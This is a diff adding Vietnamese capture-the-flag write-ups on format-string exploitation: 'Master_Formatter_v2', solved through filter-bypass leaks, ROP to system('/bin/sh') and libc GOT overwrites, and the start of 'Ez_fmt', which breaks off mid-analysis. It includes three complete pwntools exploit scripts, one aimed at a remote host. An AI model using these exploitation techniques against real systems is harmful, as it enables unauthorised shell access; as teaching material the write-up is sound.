@@ -465,3 +465,628 @@ p.interactive()
 ![here](/assets/images/shellfsb.png)
 
 - ngoài ra cũng có 1 bài rất hay về fsb , mình sẽ để ở [here](https://hackmd.io/@kuvee/SkaBUl2rJl)
+
+## Master_Formatter_v2 
+
+### overview
+
+- ta sẽ có 3 option chính ở bài này 
+
+```cs
+// local variable allocation has failed, the output may be wrong!
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  int OPTION; // [rsp+0h] [rbp-10h] BYREF
+  int v5; // [rsp+4h] [rbp-Ch]
+  unsigned __int64 v6; // [rsp+8h] [rbp-8h]
+
+  v6 = __readfsqword(0x28u);
+  v5 = 0;
+  while ( 1 )
+  {
+    menu(*(_QWORD *)&argc, argv, envp);
+    argv = (const char **)&OPTION;
+    *(_QWORD *)&argc = "%d%*c";
+    __isoc99_scanf("%d%*c", &OPTION);
+    if ( OPTION == 4 )
+      return 0;
+    if ( OPTION > 4 )
+      goto LABEL_14;
+    switch ( OPTION )
+    {
+      case 3:
+        duplicate();
+        break;
+      case 1:
+        hint();
+        break;
+      case 2:
+        if ( v5 > 1 )
+        {
+          *(_QWORD *)&argc = "Ran out";
+          puts("Ran out");
+        }
+        else
+        {
+          vuln();
+          ++v5;
+        }
+        break;
+      default:
+LABEL_14:
+        *(_QWORD *)&argc = "Invalid input";
+        puts("Invalid input");
+        break;
+    }
+  }
+}
+```
+
+- option1 : ta sẽ có 1 libc leak 
+
+```c
+int hint()
+{
+  return printf("Have this: %p\n", &fgets);
+}
+```
+
+- option2  : không có ```bof``` ở đây , ta sẽ nói về điều này sau 
+
+```c
+unsigned __int64 duplicate()
+{
+  char s[40]; // [rsp+10h] [rbp-30h] BYREF
+  unsigned __int64 v2; // [rsp+38h] [rbp-8h]
+
+  v2 = __readfsqword(0x28u);
+  memset(s, 0, 0x1EuLL);
+  printf("Input\n>> ");
+  fgets(s, 29, stdin);
+  strdup(s);
+  return v2 - __readfsqword(0x28u);
+}
+```
+
+- option3 : ta được input 29 bytes và có ngay 1 ```fsb``` , tuy nhiên ta có 1 hàm ```filter``` ở phía trước  
+
+```c
+unsigned __int64 vuln()
+{
+  char s[40]; // [rsp+0h] [rbp-30h] BYREF
+  unsigned __int64 v2; // [rsp+28h] [rbp-8h]
+
+  v2 = __readfsqword(0x28u);
+  memset(s, 0, 0x1EuLL);
+  printf("Input\n>> ");
+  fgets(s, 29, stdin);
+  filter(s);
+  printf(s);
+  return v2 - __readfsqword(0x28u);
+}
+```
+
+- filter : nó sẽ check xem trong input ```fsb``` của ta có các kí tự này không? nếu có thì exit , bình thường ta thường sẽ sử dụng ```%p , %x``` để leak đúng không? tuy nhiên nó đã bị filer rồi 
+
+```c
+char *__fastcall filter(const char *a1)
+{
+  char *result; // rax
+
+  if ( strchr(a1, 'p')
+    || strchr(a1, 'u')
+    || strchr(a1, 'd')
+    || strchr(a1, 'x')
+    || strchr(a1, 'f')
+    || strchr(a1, 'i')
+    || strchr(a1, 'e')
+    || strchr(a1, 'g')
+    || strchr(a1, 'a')
+    || strchr(a1, 'U')
+    || strchr(a1, 'U')
+    || strchr(a1, 'D')
+    || strchr(a1, 'X')
+    || strchr(a1, 'F')
+    || strchr(a1, 'I')
+    || strchr(a1, 'E')
+    || strchr(a1, 'G')
+    || (result = strchr(a1, 'A')) != 0LL )
+  {
+    puts("Cant leak anything");
+    exit(1);
+  }
+  return result;
+}
+```
+
+- vấn đề này có khá nhiều cách giải quyết , ta có thể dùng %x$s với x là offset , nếu may mắn thì ta hoàn toàn có thể leak được   , hoặc 1 cách khác là dùng %o đây là 1 định dạng octal , tuy nhiên nó chỉ leak tối đa 4 bytes ? địa chỉ stack sẽ là 0x7ffx  vậy tỉ lệ thành công là 1/16
+
+- payload: 
+
+```cs
+p.sendlineafter(b'>> ',b'2')
+input()
+p.sendlineafter(b'>> ',b'%12$o')
+
+leak = int(p.recvline()[:-1],8)
+print(hex(leak))
+```
+
+```cs
+[*] leak: 0x7f5c56f24000
+
+0xeb78c160
+```
+
+so với 
+
+```cs
+00:0000│ rsp 0x7ffceb78c110 ◂— 0xa6f24323125 /* '%12$o\n' */
+01:0008│-028 0x7ffceb78c118 ◂— 0
+... ↓        2 skipped
+04:0020│-010 0x7ffceb78c130 —▸ 0x557c8283ad78 (__do_global_dtors_aux_fini_array_entry) —▸ 0x557c82838210 (__do_global_dtors_aux) ◂— endbr64
+05:0028│-008 0x7ffceb78c138 ◂— 0x1854714781e65a00
+06:0030│ rbp 0x7ffceb78c140 —▸ 0x7ffceb78c160 ◂— 1
+07:0038│+008 0x7ffceb78c148 —▸ 0x557c828386c5 (main+134) ◂— add dword ptr [rbp - 0xc], 1
+```
+
+- vậy ta sẽ dùng %offset$s sẽ safe hơn không phải random , ý tưởng là ta có libc -> ta sẽ có environ libc và con trỏ này chứa địa chỉ stack , tuy nhiên nó có 1 số byte bị filter nên ta cần mở gdb tìm các environ khác như sau: 
+
+- lấy 4 bytes của stack và search , xong trừ nó đi 2 ta sẽ được 1 địa chỉ libc chứa địa chỉ stack
+
+![find](/assets/images/findaddress.png)
+
+
+với payload này , địa chỉ libc là mình tìm được ở công đoạn trên , vì random đôi lúc dính 1 byte filter nên cần chạy nhiều lần
+
+
+```python
+payload = b'%7$szzzz'
+payload += p64(libc.address +0x1ff550)
+```
+
+- ta thấy lúc này ở offset 7 chứa địa chỉ stack , vì vậy ta có thể leak thành công ^^
+
+![stack](/assets/images/stack-address.png)
+
+![here](/assets/images/stack-leak3.png)
+
+- điều tiếp theo cần làm là ta chỉ có 2 lần được ```fsb``` , ta phải ghi giá trị biến đếm thành 1 giá trị âm (0x80xxxxx) , và ta cũng sẽ tính toán ```saved_rip``` của ```main```
+
+
+```cs
+leak_stack = u64(p.recv(6).ljust(8,b'\x00'))
+
+count = leak_stack - 0x118 - 0xc + 3
+saved_rbp_main = leak_stack - 0x118
+log.info(f'leak_stack: {hex(leak_stack)}')
+log.info(f'count: {hex(count)}')
+log.info(f'saved_rbp_main: {hex(saved_rbp_main)}')
+
+payload_change_count = b'%128c%8$hhn'
+payload_change_count = payload_change_count.ljust(16,b'z')
+payload_change_count += p64(count)
+
+p.sendlineafter(b'>> ',b'2')
+p.sendlineafter(b'>> ',payload_change_count)
+```
+
+
+
+- ta thấy giờ ta có thể thoải mái build rop_chain trên stack 
+
+![here](/assets/images/loop_good.png)
+
+- cuối cùng ta sẽ overwrite ```saved_rip``` của main nữa là được 
+
+- tìm các gadget: 
+
+```cs
+ploi@PhuocLoiiiii:~/pwn/FSB/Master_Formatter_v2$ ROPgadget --binary libc.so.6 | grep -e ".*: pop rdi ; ret$"
+0x0000000000028715 : pop rdi ; ret
+ploi@PhuocLoiiiii:~/pwn/FSB/Master_Formatter_v2$ ROPgadget --binary libc.so.6 | grep -e ".*: ret$"
+0x0000000000026a3e : ret
+```
+
+- lúc đầu mình thử build payload bằng pwntools , tuy nhiên nó vướng badbyte nên hình như không thành công
+
+```cs
+badbytes = frozenset({0x70, 0x75,0x64,0x78,0x66,0x69,0x65,0x67,0x61,0x55,0x44,0x58,0x46,0x49,0x45,0x47})
+
+def build_fsb(offset,where,what,size,badbytes):
+    payload = fmtstr_payload(offset,{where:what},write_size=size,badbytes=badbytes)
+    p.sendlineafter(b'>> ',b'2')
+    p.sendlineafter(b'>> ',payload)
+
+input()
+build_fsb(6,saved_rip,bytes.fromhex(hex(POP_RDI)[2:])[:-1],"byte",badbytes)
+build_fsb(6,saved_rip+1,bytes.fromhex(hex(POP_RDI)[2:])[:-2],"byte",badbytes)
+build_fsb(6,saved_rip+2,bytes.fromhex(hex(POP_RDI)[2:])[:-3],"byte",badbytes)
+build_fsb(6,saved_rip+3,bytes.fromhex(hex(POP_RDI)[2:])[:-4],"byte",badbytes)
+build_fsb(6,saved_rip+4,bytes.fromhex(hex(POP_RDI)[2:])[:-5],"byte",badbytes)
+build_fsb(6,saved_rip+5,bytes.fromhex(hex(POP_RDI)[2:])[:-6],"byte",badbytes)
+```
+
+- vậy thì ta viết 1 payload ghi từng byte như sau: 
+
+```python
+def write_byte(addr,b):
+    log.info(f"target : 0x{addr:x}")
+    if b == 0:
+        b = 256
+    fmt = f"%{b}c%8$hhn".encode().ljust(16,b"\x01") + p64(addr)
+    assert len(fmt) == 24
+    return fmt
+```
+
+epx: 
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+
+exe = ELF("./chall_patched")
+libc = ELF("./libc.so.6")
+ld = ELF("./ld-linux-x86-64.so.2")
+
+context.binary = exe
+
+p = process()
+
+p.sendlineafter(b'>> ',b'1')
+p.recvuntil(b'Have this: ')
+libc.address = int(p.recvline()[:-1],16) - libc.sym.fgets
+log.info(f'leak: {hex(libc.address)}')
+
+p.sendlineafter(b'>> ',b'2')
+libc_environ = libc.sym.environ
+payload = b'%7$szzzz'
+payload += p64(libc.address + 0x1ff8c2 - 2)
+p.sendlineafter(b'>> ',payload)
+leak_stack = u64(p.recv(6).ljust(8,b'\x00'))
+
+count = leak_stack - 0x118 - 0xc + 3
+saved_rbp_main = leak_stack - 0x118
+saved_rip = saved_rbp_main + 8
+log.info(f'leak_stack: {hex(leak_stack)}')
+log.info(f'count: {hex(count)}')
+log.info(f'saved_rbp_main: {hex(saved_rbp_main)}')
+
+payload_change_count = b'%128c%8$hhn'
+payload_change_count = payload_change_count.ljust(16,b'z')
+payload_change_count += p64(count)
+
+p.sendlineafter(b'>> ',b'2')
+p.sendlineafter(b'>> ',payload_change_count)
+
+POP_RDI = 0x0000000000028715+libc.address
+ret = POP_RDI+1
+bin_sh = next(libc.search(b'/bin/sh\x00'))
+system = libc.sym.system
+
+log.info(f'system: {hex(system)}')
+log.info(f'pop_rdi: {hex(POP_RDI)}')
+log.info(f'bin_sh: {hex(bin_sh)}')
+
+pop_rdi = ROP(libc).find_gadget(["pop rdi","ret"])[0]
+rop = [pop_rdi+1,pop_rdi,next(libc.search(b"/bin/sh\0")),libc.sym.system]
+rop = b"".join([p64(i) for i in rop])
+
+def write_byte(addr,b):
+    log.info(f"target : 0x{addr:x}")
+    if b == 0:
+        b = 256
+    fmt = f"%{b}c%8$hhn".encode().ljust(16,b"\x01") + p64(addr)
+    assert len(fmt) == 24
+    return fmt
+pl = p64(POP_RDI) + p64(bin_sh) + p64(ret) +p64(system)
+
+input()
+
+for i, c in enumerate(pl):
+    p.sendlineafter(b'>> ',b'2')
+    payload1 = write_byte(saved_rip+i,c)
+    p.sendlineafter(b'>> ',payload1)
+
+p.sendlineafter(b'>> ',b'4')
+
+
+
+p.interactive()
+```
+
+![build](/assets/images/build_rip.png)
+
+- lí do mình làm lại bài này là nó đề cập đến overwrite ```got``` của libc , vậy ta sẽ cùng làm theo cách đó thử 
+
+- truớc hết là ta cần hiểu quy trình của nó , ở option2 ta thấy nó gọi ```strdup``` và đúng là kh phải tự nhiên nó gọi hàm này 
+
+
+https://elixir.bootlin.com/glibc/latest/source/string/strdup.c
+
+ta có thể thấy strdup nó sẽ gọi ```strlen``` , ```malloc``` , ```memcpy``` 
+
+- ở đây nó sẽ gọi ```strlen``` và bên dưới ta cũng thấy nó sẽ call ```malloc```
+
+![here](/assets/images/libc_got.png)
+
+- lúc này nó sẽ jmp đến got@libc , và địa chỉ đó hoàn toàn có thể ghi?
+
+![here](/assets/images/libc_got_23.png)
+
+- vậy ý tưởng là ta có thể ghi 1 one_gadget vào đúng không :))) 
+
+one_gadget : 
+
+```cs
+ploi@PhuocLoiiiii:~/pwn/FSB/Master_Formatter_v2$ one_gadget ./libc.so.6
+0x54ecc posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
+constraints:
+  address rsp+0x68 is writable
+  rsp & 0xf == 0
+  rax == NULL || {"sh", rax, rip+0x16b52a, r12, ...} is a valid argv
+  rbx == NULL || (u16)[rbx] == NULL
+
+0x54ed3 posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
+constraints:
+  address rsp+0x68 is writable
+  rsp & 0xf == 0
+  rcx == NULL || {rcx, rax, rip+0x16b52a, r12, ...} is a valid argv
+  rbx == NULL || (u16)[rbx] == NULL
+
+0xeb58e execve("/bin/sh", rbp-0x50, r12)
+constraints:
+  address rbp-0x48 is writable
+  rbx == NULL || {"/bin/sh", rbx, NULL} is a valid argv
+  [r12] == NULL || r12 == NULL || r12 is a valid envp
+
+0xeb5eb execve("/bin/sh", rbp-0x50, [rbp-0x78])
+constraints:
+  address rbp-0x50 is writable
+  rax == NULL || {"/bin/sh", rax, NULL} is a valid argv
+  [[rbp-0x78]] == NULL || [rbp-0x78] == NULL || [rbp-0x78] is a valid envp
+```
+
+- và check lại thì không có thằng nào thõa :v
+
+check thêm thằng này : https://github.com/ChrisTheCoolHut/angry_gadget cũng không có
+
+- ta cũng có thể check tại ```malloc``` : 
+
+![here](/assets/images/got_libc_1.png)
+
+- check memcpy 
+
+ở đây nó cũng không hề thõa bất kì điều kiện nào , nhưng hãy để ý 1 điều là trên stack có chuỗi ta nhập vào? vậy điều này có thể làm được gì 
+
+![here](/assets/images/memcpyu.png)
+
+- ta sẽ tìm kiếm 1 gadget có thể pop 3 thằng đó ra và tiếp theo nó sẽ return về payload mà ta nhập vào
+
+exp: 
+
+
+```python
+from pwn import *
+
+elf = context.binary = ELF("./chall_patched",checksec=False)
+p = elf.process()
+#p = remote("localhost",10002)
+libc = elf.libc
+
+context.arch = elf.arch
+
+# gdb.attach(p,'''
+#     init-gef
+#     b *strdup+52
+#     c
+# ''')
+
+def vuln(payload):
+    p.sendlineafter(b">> ",b"2")
+    p.sendlineafter(b">> ",payload)
+
+def write_payload_8(value,addr):
+    for i in range(8):
+        if(value == 0):
+            break
+        b = value % 0x100
+        value = value // 0x100
+        payload = f"%{b}c%8$hhn".ljust(16,'.')
+        payload = payload.encode() + p64(addr + i)
+        vuln(payload)
+
+def another_one(payload):
+    p.sendlineafter(b">> ",b"3")
+    p.sendlineafter(b">> ",payload)
+
+
+p.sendlineafter(b">> ",b"1")
+p.recvuntil(b"this: ")
+x = p.recvline()[:-1]
+libc.address = int(x,16) - libc.sym.fgets
+log.critical(f"libc: {hex(libc.address)}")
+
+addr = 0x1fe170 + libc.address
+log.info(f'addr: {hex(addr)}')
+pop_rdi = 0x0000000000028715 + libc.address
+pop_chain = 0x0000000000028710 + libc.address # pop r13 ; pop r14 ; pop r15 ; ret
+ret = 0x0000000000026a3e + libc.address
+
+log.info(f'ropchain: {hex(pop_chain)}')
+# print(hex(pop_chain))
+# print(hex(pop_chain&0xffffff))
+# print(hex(addr))
+
+payload = f"%{0x1000}c%8$hn".ljust(16,'.')
+payload = payload.encode() + p64(addr - 1)
+vuln(payload)
+
+payload = f"%{(pop_chain//0x100)&0xffff}c%8$hn".ljust(16,'.')
+payload = payload.encode() + p64(addr +1)
+input()
+vuln(payload)
+another_one(p64(pop_rdi) + p64(next(libc.search(b'/bin/sh'))) + p64(libc.sym.system))
+
+p.interactive()
+```
+
+
+- ngoài ra còn 1 cách khác nữa , đây là plt của ```strlen``` nó sẽ nhảy đến đoạn đó để thực thi địa chỉ ```got``` , tuy nhiên ở đây mình đã input '/bin/sh' và bằng 1 cách nào đó nó nằm ở ```rdi``` luôn , nên nếu ta overwrite địa chỉ này thành system và ta sẽ có 1 shell ...
+
+![here](/assets/images/got_libc_hehe.png)
+
+exp : 
+
+```python
+from pwn import *
+BINARY_NAME = './chall_patched'
+exe = context.binary = ELF(BINARY_NAME)
+libc = exe.libc
+
+def leak():
+    s.sendlineafter(b'> ', b'1')
+    return int(s.recvline().strip().split(b' ')[-1], 16) - libc.sym.fgets
+
+def fmt(p):
+    s.sendlineafter(b'> ', b'2')
+    s.sendlineafter(b'> ', p)
+
+def write(addr, val):
+    for i in range(2):
+        if val & 0xffff != 0:
+            fmt(flat({
+                0: f'%{val&0xffff}c%8$hn'.encode(),
+                0x10: addr,
+            }, filler=b'\x00'))
+        val >>= 16
+        addr += 2
+
+def exploit(s):
+    libc.address = leak()
+    log.info(f'libc @ 0x{libc.address:x}')
+
+    write(libc.address + 0x1FE080, libc.sym.system)
+    s.sendlineafter(b'> ', b'3')
+    s.sendlineafter(b'> ', b'/bin/sh')
+    s.interactive()
+
+if __name__ == '__main__':
+    if len(sys.argv) == 1:
+        s = process(BINARY_NAME)
+    else:
+        s = remote('34.70.212.151', 8008)
+    exploit(s)
+```
+
+ref : 
+
+[here](https://github.com/peace-ranger/CTF-WriteUps/tree/main/2023/backdoorCTF/(pwn)%20Baby%20Formatter)
+
+[here](https://github.com/5kuuk/CTF-writeups/blob/main/backdoorctf-2023/pwn-+emptydb/exploit.c)
+
+[1 bài sử dụng định dạng khác](https://sashactf.gitbook.io/pwn-notes/ctf-writeups/cor-ctf-2024/format-string#floating-point)
+
+
+## Ez_fmt
+
+
+checksec: no canary nhưng không có ```bof``` ở bài này
+
+```cs
+ploi@PhuocLoiiiii:~/pwn/FSB/WhiteHat-Play-11/pwn06-Ez_fmt$ checksec ez_fmt_patched
+[*] '/home/ploi/pwn/FSB/WhiteHat-Play-11/pwn06-Ez_fmt/ez_fmt_patched'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+    RUNPATH:  b'.'
+```
+
+### overviewoverview
+
+- 1 bài khá ngắn , ta được input 80 byte và check nó ở ```restricted_filter```
+
+```c
+int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
+{
+  char buf[88]; // [rsp+0h] [rbp-60h] BYREF
+  unsigned __int64 v4; // [rsp+58h] [rbp-8h]
+
+  v4 = __readfsqword(0x28u);
+  init();
+  puts("Welcome to My Echo Service :##");
+  while ( 1 )
+  {
+    fgets(buf, 80, stdin);
+    if ( restricted_filter(buf) == -1 )
+      break;
+    printf(buf);
+  }
+  exit(1);
+}
+```
+
+- restricted_filter:  hàm này nãy sẽ check kí tự đầu và thứ hai có trong các bytes bị filter không?
+
+```cs
+int __cdecl restricted_filter(const char *str)
+{
+  int result; // eax
+  int i; // [rsp+1Ch] [rbp-14h]
+
+  i = 0;
+  while ( 2 )
+  {
+    if ( i >= strlen(str) )
+      return 1;
+    switch ( str[i] )
+    {
+      case 'A':
+      case 'E':
+      case 'F':
+      case 'G':
+      case 'X':
+      case 'a':
+      case 'd':
+      case 'e':
+      case 'f':
+      case 'g':
+      case 'i':
+      case 'o':
+      case 'p':
+      case 's':
+      case 'u':
+      case 'x':
+        puts("Invalid character :TT");
+        result = -1;
+        break;
+      default:
+        ++i;
+        continue;
+    }
+    break;
+  }
+  return result;
+}
+```
+- nhìn qua thì chỉ có 1 bug ```fsb``` , tuy nhiên ta lại bị filter các byte để leak như %p , %o , %x , %s
+- GOT của file bài này full vì vậy không thể overwrite GOT , tuy nhiên got của libc chỉ là 1 phần -> có thể overwrite thằng này nhưng có lẽ build rop_chain overwrite ```saved_rip``` dễ dàng hơn , trước hết là cần tạo 1 loop vì không có libc , ta cần leak xong rồi mới exploit được
+
+
+- ý tưởng đầu tiên để leak libc là sử dụng %$s , tuy nhiên đây là hình ảnh trên stack thì ta không thấy bất cứ con trỏ nào chứa địa chỉ libc 
+
+![here](/assets/images/whitehat-11/1.png)
+
+- tuy nhiên ta có thể control khá nhiều bytes trên stack , điều này có ích như thế nào?  ta sẽ tìm kiếm 1 địa chỉ nào đó có địa chỉ gần giống với địa chỉ chứa ```libc_start_main``` , và ghi 1 bytes vào đó , nếu may mắn ta có thể hoàn toàn leak được libc 
+- ta sẽ thay đổi LSB ở đây thành 0x_8
+
+
+- vậy làm sao có thể leak libc? ta thấy ở đây ta sẽ được input 80 bytes , và ở trên stack ta cũng thấy được có 2 địa chỉ stack ở đó 
+
+![here](/assets/images/whitehat-11/2.png)
+
+- vậy ta sẽ làm gì với điều này?
+
